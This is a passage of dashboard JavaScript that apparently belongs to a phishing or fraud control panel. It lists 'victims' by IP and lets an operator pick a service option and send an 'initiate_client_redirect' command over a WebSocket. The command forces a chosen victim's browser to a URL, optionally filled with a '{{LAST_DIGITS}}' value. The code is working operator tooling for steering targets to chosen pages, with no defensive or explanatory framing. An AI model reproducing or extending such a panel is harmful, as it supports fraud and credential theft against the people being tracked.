            confirmRedirectBtn.disabled = true;
            confirmRedirectBtn.classList.add('opacity-50', 'cursor-not-allowed');
            confirmRedirectBtn.classList.remove('hover:bg-purple-700', 'button-glow');
        }


        servicesToRender.forEach(service => {
            const serviceWrapper = document.createElement('div');
            serviceWrapper.className = 'service-group mb-1';

            const mainServiceDiv = document.createElement('div');
            mainServiceDiv.className = 'redirect-service-item flex items-center justify-between p-3 bg-gray-750 hover:bg-gray-600 rounded-lg cursor-pointer transition-colors';
            mainServiceDiv.dataset.serviceId = service.id;

            let iconHtml = '';
            if (service.iconType === 'img' && service.iconUrl) {
                iconHtml = `<img src="${service.iconUrl}" alt="${service.name} icon" class="w-5 h-5 mr-3 flex-shrink-0">`;
            } else if (service.iconType === 'span') {
                iconHtml = `<span class="w-6 h-6 flex items-center justify-center rounded-full ${service.iconBg || 'bg-gray-600'} text-white text-sm font-bold mr-3 flex-shrink-0">${service.iconChar || service.name[0]}</span>`;
            } else {
                iconHtml = `<i class="${service.icon || 'fas fa-question-circle'} text-xl mr-3 text-gray-300 flex-shrink-0"></i>`;
            }

            mainServiceDiv.innerHTML = `
                <div class="flex items-center">
                    ${iconHtml}
                    <span class="text-sm font-medium">${service.name}</span>
                </div>
                <i class="fas fa-chevron-down text-gray-400 transition-transform duration-200"></i>`;

            const subOptionsContainer = document.createElement('div');
            subOptionsContainer.className = 'sub-options-container hidden pl-6 pr-2 py-1 space-y-1 bg-gray-800 rounded-b-md';

            if (service.subOptions && service.subOptions.length > 0) {
                service.subOptions.forEach(subOpt => {
                    const subOptDiv = document.createElement('div');
                    subOptDiv.className = 'sub-option-item flex items-center justify-between p-2.5 bg-gray-700 hover:bg-gray-650 rounded-md cursor-pointer transition-colors';
                    subOptDiv.dataset.subOptionId = subOpt.id;
                    subOptDiv.dataset.redirectUrl = subOpt.redirectUrl;
                    subOptDiv.dataset.requiresInput = subOpt.requiresInput;
                    subOptDiv.dataset.inputPrompt = subOpt.inputPrompt;
                    subOptDiv.dataset.inputplaceholder = subOpt.inputPlaceholder;
                    subOptDiv.dataset.inputmaxlength = subOpt.inputMaxLength;
                    subOptDiv.dataset.inputtype = subOpt.inputType;
                    subOptDiv.dataset.name = subOpt.name;
                    subOptDiv.dataset.description = subOpt.description;

                    subOptDiv.innerHTML = `
                        <div>
                            <p class="text-sm font-medium text-gray-100">${subOpt.name}</p>
                            <p class="text-xs text-gray-400">${subOpt.description}</p>
                        </div>
                        <i class="fas fa-check text-green-500 opacity-0 transition-opacity duration-200"></i>`;

                    subOptDiv.addEventListener('click', function (e) {
                        e.stopPropagation();
                        redirectServiceListContainer.querySelectorAll('.sub-option-item.selected').forEach(selected => {
                            selected.classList.remove('selected', 'bg-purple-700');
                            selected.querySelector('.fa-check').classList.add('opacity-0');
                        });
                        redirectServiceListContainer.querySelectorAll('.redirect-service-item.selected-main').forEach(mainSelected => {
                            mainSelected.classList.remove('selected-main', 'bg-purple-600');
                        });

                        this.classList.add('selected', 'bg-purple-700');
                        this.querySelector('.fa-check').classList.remove('opacity-0');
                        mainServiceDiv.classList.add('selected-main', 'bg-purple-600');


                        selectedServiceForRedirect = {
                            serviceId: service.id,
                            serviceName: service.name,
                            subOptionId: this.dataset.subOptionId, // This was likely fine as subOptionId is camelCase
                            subOptionName: this.dataset.name,
                            description: this.dataset.description,
                            redirectUrl: this.dataset.redirectUrl,       // READ as camelCase
                            requiresInput: this.dataset.requiresInput === 'true', // READ as camelCase, then convert
                            inputPrompt: this.dataset.inputPrompt,     // READ as camelCase
                            inputPlaceholder: this.dataset.inputPlaceholder, // READ as camelCase
                            inputMaxLength: this.dataset.inputMaxLength ? parseInt(this.dataset.inputMaxLength) : undefined, // READ as camelCase
                            inputType: this.dataset.inputType        // READ as camelCase
                        };
                        console.log('Selected service for redirect:', selectedServiceForRedirect);
                        if (confirmRedirectBtn) {
                            confirmRedirectBtn.disabled = false;
                            confirmRedirectBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                            confirmRedirectBtn.classList.add('hover:bg-purple-700', 'button-glow');
                        }
                    });
                    subOptionsContainer.appendChild(subOptDiv);
                });
            }

            mainServiceDiv.addEventListener('click', function () {
                const isOpen = subOptionsContainer.classList.contains('hidden');
                redirectServiceListContainer.querySelectorAll('.sub-options-container').forEach(container => {
                    if (container !== subOptionsContainer) {
                        gsap.to(container, { height: 0, opacity: 0, duration: 0.2, onComplete: () => container.classList.add('hidden') });
                        const prevChevron = container.previousElementSibling.querySelector('.fa-chevron-down');
                        if (prevChevron) prevChevron.classList.remove('rotate-180');
                    }
                });

                // Toggle current
                const chevron = this.querySelector('.fa-chevron-down');
                if (isOpen) {
                    subOptionsContainer.classList.remove('hidden');
                    gsap.fromTo(subOptionsContainer, { height: 0, opacity: 0 }, { height: 'auto', opacity: 1, duration: 0.3, ease: 'power2.out' });
                    if (chevron) chevron.classList.add('rotate-180');
                } else {
                    gsap.to(subOptionsContainer, { height: 0, opacity: 0, duration: 0.2, ease: 'power2.in', onComplete: () => subOptionsContainer.classList.add('hidden') });
                    if (chevron) chevron.classList.remove('rotate-180');
                }
            });
            serviceWrapper.appendChild(mainServiceDiv);
            serviceWrapper.appendChild(subOptionsContainer);
            redirectServiceListContainer.appendChild(serviceWrapper);
        });
    }


    function openRedirectModal(clientIp) {
        if (!redirectServiceModal || !redirectClientIpDisplay) return;
        currentClientIpForRedirect = clientIp;
        redirectClientIpDisplay.textContent = clientIp;
        selectedServiceForRedirect = null;
        renderServiceList(redirectableServices);
        if (redirectServiceSearchInput) redirectServiceSearchInput.value = '';

        redirectServiceModal.classList.remove('hidden');
        gsap.to(redirectServiceModal, { opacity: 1, duration: 0.2 });
        gsap.to(redirectServiceModalContent, { opacity: 1, scale: 1, duration: 0.3, ease: 'power2.out' });
        document.body.classList.add('overflow-hidden');
    }

    function closeRedirectModal() {
        if (!redirectServiceModal) return;
        gsap.to(redirectServiceModalContent, { opacity: 0, scale: 0.95, duration: 0.2, ease: 'power2.in' });
        gsap.to(redirectServiceModal, {
            opacity: 0, duration: 0.3, onComplete: () => {
                redirectServiceModal.classList.add('hidden');
                if (extraInputModal.classList.contains('hidden') && clientModal.classList.contains('hidden') && infoModal.classList.contains('hidden')) { // Check other modals
                    document.body.classList.remove('overflow-hidden');
                }
            }
        });
    }

    if (closeRedirectModalBtn) closeRedirectModalBtn.addEventListener('click', closeRedirectModal);
    if (redirectServiceModal) redirectServiceModal.addEventListener('click', (event) => { if (event.target === redirectServiceModal) closeRedirectModal(); });

    if (redirectServiceSearchInput) {
        redirectServiceSearchInput.addEventListener('input', function () {
            const searchTerm = this.value.toLowerCase();
            const filteredServices = redirectableServices.filter(service =>
                service.name.toLowerCase().includes(searchTerm) ||
                (service.subOptions && service.subOptions.some(sub =>
                    sub.name.toLowerCase().includes(searchTerm) ||
                    sub.description.toLowerCase().includes(searchTerm)
                ))
            );
            renderServiceList(filteredServices);
        });
    }
    function sendRedirectCommandToServer(targetIp, finalRedirectUrl, serviceInfo) {
        showNotification(`Requesting redirect for ${targetIp} to ${serviceInfo.subOptionName || serviceInfo.name}...`, 'info');
        console.log('Initiating redirect:', { ip: targetIp, url: finalRedirectUrl, service: serviceInfo });
        if (dashboardSocket && dashboardSocket.readyState === WebSocket.OPEN) {
            dashboardSocket.send(JSON.stringify({
                type: 'initiate_client_redirect',
                payload: {
                    target_ip: targetIp,
                    redirect_url: finalRedirectUrl
                }
            }));
        } else {
            showNotification('Cannot initiate redirect: Dashboard WebSocket not connected.', 'error');
        }
    }

    if (confirmRedirectBtn) {
        confirmRedirectBtn.addEventListener('click', () => {
            console.log("<<<<< JS: confirmRedirectBtn clicked. selectedServiceForRedirect is: >>>>>",
                selectedServiceForRedirect ? JSON.parse(JSON.stringify(selectedServiceForRedirect)) : null
            );
            // Log the specific properties we are about to check
            console.log("<<<<< JS: Checking selectedServiceForRedirect.redirectUrl: >>>>>", selectedServiceForRedirect ? selectedServiceForRedirect.redirectUrl : 'N/A');
            console.log("<<<<< JS: Checking selectedServiceForRedirect.requiresInput: >>>>>", selectedServiceForRedirect ? selectedServiceForRedirect.requiresInput : 'N/A');

            // **** CORRECTED CHECK: Use camelCase for redirectUrl and boolean for requiresInput ****
            if (selectedServiceForRedirect && selectedServiceForRedirect.redirectUrl && currentClientIpForRedirect) {
                if (selectedServiceForRedirect.requiresInput) { // requiresInput is a boolean
                    currentRedirectPayloadForExtraInput = {
                        target_ip: currentClientIpForRedirect,
                        base_redirect_url: selectedServiceForRedirect.redirectUrl,
                        service_info: selectedServiceForRedirect
                    };

                    console.log("<<<<< JS: About to show extraInputModal. Is extraInputModal valid? >>>>>", extraInputModal); // Your good debug log

                    if (extraInputPrompt) extraInputPrompt.textContent = selectedServiceForRedirect.inputPrompt || 'Enter required information:';
                    if (extraInputField) {
                        extraInputField.placeholder = selectedServiceForRedirect.inputPlaceholder || '';
                        extraInputField.value = '';
                        extraInputField.maxLength = selectedServiceForRedirect.inputMaxLength || 50;
                        extraInputField.type = selectedServiceForRedirect.inputType || 'text';
                    }

                    // **** THIS IS THE CORRECTED PART ****
                    if (extraInputModal && extraInputModalContent) { // Check both modal and its content div
                        extraInputModal.classList.remove('hidden');
                        gsap.to(extraInputModal, { opacity: 1, duration: 0.2 });
                        gsap.to(extraInputModalContent, { opacity: 1, scale: 1, duration: 0.3, ease: 'power2.out' });
                        document.body.classList.add('overflow-hidden');
                        if (extraInputField) extraInputField.focus();
                    } else {
                        console.error("<<<<< JS: extraInputModal or extraInputModalContent is NULL here, cannot show it! >>>>>");
                        showNotification("Error: UI component for extra input is missing.", "error");
                    }
                    // **** END OF CORRECTION ****

                    closeRedirectModal(); // Close the main service selection modal
                } else {
                    sendRedirectCommandToServer(currentClientIpForRedirect, selectedServiceForRedirect.redirectUrl, selectedServiceForRedirect);
                    closeRedirectModal();
                }
            } else {
                showNotification('Please select a specific service option to redirect to.', 'warning');
            }
        });
    }

    if (cancelExtraInputBtn) cancelExtraInputBtn.addEventListener('click', closeExtraInputModal);
    if (confirmExtraInputBtn) {
        confirmExtraInputBtn.addEventListener('click', () => {
            const extraValue = extraInputField ? extraInputField.value.trim() : '';
            if (extraValue && currentRedirectPayloadForExtraInput) {
                let finalRedirectUrl = currentRedirectPayloadForExtraInput.base_redirect_url;
                if (finalRedirectUrl.includes('{{LAST_DIGITS}}')) {
                    finalRedirectUrl = finalRedirectUrl.replace('{{LAST_DIGITS}}', encodeURIComponent(extraValue));
                } else { // Fallback to a generic query parameter if placeholder not found
                    const separator = finalRedirectUrl.includes('?') ? '&' : '?';
                    finalRedirectUrl += `${separator}extra_input=${encodeURIComponent(extraValue)}`;
                }

                sendRedirectCommandToServer(currentRedirectPayloadForExtraInput.target_ip, finalRedirectUrl, currentRedirectPayloadForExtraInput.service_info);
                closeExtraInputModal();
            } else if (!extraValue) {
                showNotification('Please enter the required information.', 'warning');
            }
        });
    }
    if (extraInputModal) extraInputModal.addEventListener('click', (event) => { if (event.target === extraInputModal) closeExtraInputModal(); });

    function closeExtraInputModal() {
        if (!extraInputModal) return;
        gsap.to(extraInputModalContent, { opacity: 0, scale: 0.95, duration: 0.2, ease: 'power2.in' });
        gsap.to(extraInputModal, {
            opacity: 0, duration: 0.3, onComplete: () => {
                extraInputModal.classList.add('hidden');
                if (redirectServiceModal.classList.contains('hidden') &&
                    clientModal.classList.contains('hidden') &&
                    infoModal.classList.contains('hidden')) { // Check all other modals
                    document.body.classList.remove('overflow-hidden');
                }
            }
        });
        currentRedirectPayloadForExtraInput = null;
    }



    // Modify the 'Redirect' button listener in addNewRow
    // This requires addNewRow to be defined before this point, or to delegate event listeners.
    // For simplicity, we'll assume addNewRow is defined above.
    // If not, event delegation on `victimsTableBody` is better.

    // The event listener for the redirect button will be attached in `addNewRow`
    // We need to make sure `openRedirectModal` is accessible to it.
    // Since `openRedirectModal` is in the same scope as `addNewRow` (DOMContentLoaded), it is.

    // In addNewRow, the redirectBtn listener should be:
    // const redirectBtn = actionsCell.querySelector('.redirect-btn');
    // if (redirectBtn) redirectBtn.addEventListener('click', () => {
    //     openRedirectModal(data.ip); // data.ip is the client's IP for that row
    // });
    // Make sure this change is made in your addNewRow function.

    // **** END NEW: Redirect Service Modal Logic ****


    // --- Start WebSocket Connection ---
    console.log("<<<<< ABOUT TO CALL connectWebSocket() >>>>>");
    connectWebSocket(); // Call the function to establish the connection

    // Replace the old 'if (typeof socket !== "undefined")' block
    // The logic is now inside connectWebSocket's onmessage handler.
    // The old `socket.on('event_name', ...)` calls are replaced by
    // `if (data.type === 'event_name_equivalent')` inside `dashboardSocket.onmessage`.

    console.log('Dashboard scripts initialized. WebSocket connection initiated.');

}); // End DOMContentLoaded